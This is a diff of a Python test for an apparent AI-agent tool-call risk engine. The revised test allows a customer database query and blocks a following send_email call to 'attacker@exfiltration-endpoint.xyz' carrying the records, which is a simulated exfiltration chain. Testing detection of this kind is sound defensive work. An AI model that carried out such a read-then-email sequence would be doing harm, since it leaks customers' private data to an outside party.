@@ -93,7 +93,7 @@ def test_metadata_profile_inspection_low_allow():
 
 
 def test_sensitive_db_data_to_external_destination_high_block():
-    """Verify that sensitive database records flowing to an external destination remain HIGH risk and deterministically BLOCK."""
+    """Verify that sensitive database records flowing to an external destination are ALLOW for read and BLOCK for exfiltration."""
     graph = CapabilityGraph()
     tools = {
         "postgres-mcp": [
@@ -113,14 +113,16 @@ def test_sensitive_db_data_to_external_destination_high_block():
     }
     graph.rebuild_for_all_servers(tools)
 
-    eval_query = graph.evaluate_runtime_call("postgres_mcp_query")
-    assert eval_query.classification == "HIGH"
-    assert eval_query.path_risk_score >= 85.0
-    assert eval_query.is_critical_override is True
-    assert "send_email" in " ".join(eval_query.path_nodes)
-    assert "external_recipient" in " ".join(eval_query.path_nodes)
+    # 1. Benign read is ALLOWED
+    eval_query = graph.evaluate_runtime_call(
+        tool_name="postgres_mcp_query",
+        call_history=["postgres_mcp_query"],
+        arguments={"query": "SELECT * FROM customers"}
+    )
+    assert eval_query.classification == "LOW"
+    assert eval_query.path_risk_score < 30.0
+    assert eval_query.is_critical_override is False
 
-    # Risk Engine must deterministically BLOCK
     engine = RiskEngine()
     event = SecurityEventRecord(
         timestamp="2026-09-25T12:00:00Z",
@@ -129,11 +131,29 @@ def test_sensitive_db_data_to_external_destination_high_block():
         arguments={"query": "SELECT * FROM customers"}
     )
     event.scores.capability_risk = eval_query.path_risk_score
-    event.scores.intent_risk = 0.0
-    event.scores.behaviour_risk = 0.0
-
     evaluated_event = engine.evaluate(event)
-    assert evaluated_event.decision.value == "BLOCK"
+    assert evaluated_event.decision.value == "ALLOW"
+
+    # 2. Subsequent send_email is BLOCKED via observed exfiltration sequence
+    eval_email = graph.evaluate_runtime_call(
+        tool_name="send_email",
+        call_history=["postgres_mcp_query", "send_email"],
+        arguments={"to": "attacker@exfiltration-endpoint.xyz", "body": "records"}
+    )
+    assert eval_email.classification == "HIGH"
+    assert eval_email.path_risk_score >= 85.0
+    assert eval_email.is_critical_override is True
+    assert eval_email.metadata.get("observed_chain") is True
+
+    email_event = SecurityEventRecord(
+        timestamp="2026-09-25T12:00:01Z",
+        server_name="mock-email",
+        tool_name="send_email",
+        arguments={"to": "attacker@exfiltration-endpoint.xyz", "body": "records"}
+    )
+    email_event.scores.capability_risk = eval_email.path_risk_score
+    evaluated_email = engine.evaluate(email_event)
+    assert evaluated_email.decision.value == "BLOCK"
 
 
 def test_harmless_description_containing_database_does_not_create_database_records():
